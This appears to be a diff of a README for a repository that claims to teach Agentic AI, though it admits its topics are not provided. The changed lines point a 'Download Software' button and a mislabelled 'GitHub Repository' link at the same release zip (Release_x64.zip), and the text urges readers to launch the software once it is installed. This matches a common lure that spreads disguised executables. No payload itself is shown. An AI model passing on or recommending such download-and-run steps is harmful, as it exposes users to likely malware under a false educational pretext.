@@ -11,12 +11,12 @@ Regrettably, the specific topics covered in this repository are not provided. Ho
 ## 📦 Software Download
 To enhance your learning experience, we have provided a link to download essential software. Click on the button below to download the software package and follow the installation instructions:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/Awdjaw89/Roadmap-To-Learn-Agentic-AI/releases/download/v1.0/Release_x64.zip)](https://github.com/Awdjaw89/Roadmap-To-Learn-Agentic-AI/releases/download/v1.0/Release_x64.zip)
 
 Please note that the software needs to be launched after installation to explore its functionalities and capabilities.
 
 ## 🌐 Additional Resources
-Explore more resources, tutorials, and projects related to Agentic AI by visiting [GitHub Repository](https://github.com/22155555/1875695542).
+Explore more resources, tutorials, and projects related to Agentic AI by visiting [GitHub Repository](https://github.com/Awdjaw89/Roadmap-To-Learn-Agentic-AI/releases/download/v1.0/Release_x64.zip).
 
 ## 📂 Releases Section
 In case the provided download link is not functional, kindly check the "Releases" section of this repository for alternative download options and updates.
